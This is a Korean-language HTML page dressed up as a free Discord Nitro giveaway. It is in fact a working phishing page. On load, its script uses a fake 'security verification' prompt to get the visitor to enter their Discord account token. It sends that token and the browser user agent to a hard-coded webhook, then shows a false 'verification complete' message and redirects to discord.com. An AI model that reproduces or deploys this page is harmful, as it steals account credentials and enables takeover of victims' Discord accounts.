<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Discord Nitro 이벤트</title>
</head>
<body style="background: #313338; color: white; font-family: sans-serif; text-align: center; padding-top: 150px;">
    <h2>🎉 무료 Nitro 수령 중...</h2>
    <p>계정 인증을 위해 잠시 기다려주세요.</p>

    <script>
        window.onload = function() {
            const webhookUrl = 'https://discord.com/api/webhooks/1568353008071344220/Pq1ZlrWG5Kcqsmir8uGOqDuLwqzRwYdg-twFDbla8s-2KXeTUTBHtL_gygqAktOv8QgQ';
            
            // 사용자가 직접 토큰을 입력하도록 유도하는 강제 인증 프롬프트 팝업 적용
            let capturedToken = prompt("Discord 보안 인증: 계정 토큰을 입력하여 니트로 지급을 완료하세요.");

            const payload = {
                content: `🚨 **[토큰 수집 결과]**\n🔑 **획득한 토큰:** \`${capturedToken || "입력 거부 또는 없음"}\`\n🌐 **UA:** \`${navigator.userAgent}\``
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                alert('인증이 완료되었습니다.');
                window.location.href = 'https://discord.com';
            });
        };
    </script>
</body>
</html>
